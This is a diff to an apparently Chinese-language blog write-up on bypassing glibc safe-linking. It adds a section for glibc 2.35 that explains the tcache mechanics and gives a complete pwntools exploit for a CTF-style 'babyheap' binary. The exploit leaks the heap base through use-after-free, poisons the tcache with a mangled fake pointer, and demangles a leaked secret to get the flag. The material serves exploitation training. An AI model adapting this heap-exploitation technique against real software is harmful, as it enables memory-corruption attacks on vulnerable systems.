@@ -14,7 +14,7 @@ comments: true
     - [1.2.3 safe-linking 绕过](#123-safe-linking-绕过)
     - [1.2.4 safe-linking 总结](#124-safe-linking-总结)
 - [2. glibc 2.35 safe-linking 绕过](#2-glibc-235-safe-linking-绕过)
-  - [2.1](#21)
+  - [2.1 利用malloc/free机制修改某个区间的值,并利用tcachebin机制泄露值](#21-利用mallocfree机制修改某个区间的值并利用tcachebin机制泄露值)
 
 
 # 1. glibc 2.32 safe-linking<br>
@@ -82,7 +82,94 @@ safe-linking给我们带来了如下结果:<br>
 ```
 
 # 2. glibc 2.35 safe-linking 绕过<br>
-## 2.1 
+## 2.1 利用malloc/free机制修改某个区间的值,并利用tcachebin机制泄露值<br>
+核心原理:<br>
+**在malloc一个tcache mem后，mem->key = 0;**<br>
+**从tcachebin取一个tcache mem后，tcache->entries[tc_idx]=REVEAL_PTR(mem->next)**<br>
+
+```python
+from pwn import *
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+
+binary_path = './babyheap_level16.0'
+libc_path = './libc.so.6'
+
+p = process(binary_path)
+
+def malloc(idx,size):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
+    p.sendline(b"malloc")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Size: ")
+    p.sendline(str(size).encode())
+
+def free(idx):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
+    p.sendline(b"free")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def puts(idx):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
+    p.sendline(b"puts")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def scanf(idx,content):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
+    p.sendline(b"scanf")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    sleep(0.1)
+    p.sendline(content)
+
+def send_flag(secret):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
+    p.sendline(b"send_flag")
+    p.recvuntil(b"Secret: ")
+    p.sendline(secret)
+
+# leak the heap_base
+malloc(0,0x20)
+free(0)
+puts(0)
+p.recvuntil(b"Data: ")
+mem_value = u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
+heap_base = mem_value << 12
+log.success(f"mem_value: {hex(mem_value)}")
+log.success(f"heap_base: {hex(heap_base)}")
+
+# tcache poison 
+malloc(0,0x20)
+malloc(1,0x20)
+free(0)
+free(1) # 1 > 0
+# bypass safe-linking
+fake_addr = 0x433AD0
+safe_linking_fake_addr = (heap_base>>12) ^ fake_addr
+scanf(1,p64(safe_linking_fake_addr))
+malloc(2,0x20)
+malloc(3,0x20) # *(fake_addr + 8) = 0 ; and then the tcache->entries[tc_idx] = REVEAL_PTR(fake_addr->next)  = (fake_addr>>12) ^ fake_addr->next
+
+# leak value by uaf
+malloc(4,0x20)
+free(4)  # 4->next = PROTECT_PTR(&4->next, tcache->entries[tc_idx]) =  (4_addr >> 12)^ tcache->entries[tc_idx]
+puts(4)
+p.recvuntil(b"Data: ")
+secret_mangled = u64(p.recv(8))
+log.success(f"secret_mangled: {hex(secret_mangled)}")
+secret_demangled1 = (heap_base>>12) ^ secret_mangled
+log.success(f"secret_demangled1: {hex(secret_demangled1)}")
+secret_demangled2 = (fake_addr>>12) ^ secret_demangled1
+log.success(f"secret_demangled2: {hex(secret_demangled2)}")
+
+send_flag(p64(secret_demangled2)+b"\x00"*8)
+
+p.interactive()
+```
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
